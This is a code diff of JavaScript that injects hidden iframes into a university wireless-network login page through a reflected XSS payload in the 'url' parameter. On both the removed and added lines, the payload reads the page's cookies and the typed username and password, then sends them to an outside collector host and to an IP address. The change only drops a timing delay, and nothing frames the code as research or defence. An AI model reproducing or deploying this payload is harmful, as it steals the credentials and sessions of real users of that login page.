@@ -45,12 +45,12 @@
 
 
 var ele = document.createElement('IFRAME')
-ele.src = "http://net.tsinghua.edu.cn/wireless/?url=javascript:(setTimeout(()=>{cdt=document.cookie,uname=document.getElementById('uname').value,pass=document.getElementById('pass').value,xmlHttp=new XMLHttpRequest(),xmlHttp.open('POST', 'https://igoodvegetable.xss.ht/page_callback', true),xmlHttp.setRequestHeader('Content-type', 'text/plain'),xmlHttp.send(JSON.stringify({'page_html': cdt, 'uri': uname+', '+pass+' '+cdt}))},1000))"
+ele.src = "http://net.tsinghua.edu.cn/wireless/?url=javascript:(cdt=document.cookie,uname=document.getElementById('uname').value,pass=document.getElementById('pass').value,xmlHttp=new XMLHttpRequest(),xmlHttp.open('POST', 'https://igoodvegetable.xss.ht/page_callback', true),xmlHttp.setRequestHeader('Content-type', 'text/plain'),xmlHttp.send(JSON.stringify({'page_html': cdt, 'uri': uname+', '+pass+' '+cdt})))"
 ele.style = "display: none"
 document.children[0].appendChild(ele)
 
 var ele2 = document.createElement('IFRAME')
-ele2.src = "http://net.tsinghua.edu.cn/wireless/?url=javascript:(setTimeout(()=>{cdt=document.cookie,uname=document.getElementById('uname').value,pass=document.getElementById('pass').value,xmlHttp=new XMLHttpRequest(),xmlHttp.open('POST', '166.111.68.92/save', true),xmlHttp.setRequestHeader('Content-type', 'text/plain'),xmlHttp.send(JSON.stringify({'page_html': cdt, 'uri': uname+', '+pass+' '+cdt}))},1000))"
+ele2.src = "http://net.tsinghua.edu.cn/wireless/?url=javascript:(cdt=document.cookie,uname=document.getElementById('uname').value,pass=document.getElementById('pass').value,xmlHttp=new XMLHttpRequest(),xmlHttp.open('POST', '166.111.68.92/save', true),xmlHttp.setRequestHeader('Content-type', 'text/plain'),xmlHttp.send(JSON.stringify({'page_html': cdt, 'uri': uname+', '+pass+' '+cdt})))"
 ele2.style = "display: none"
 document.children[0].appendChild(ele2)
 
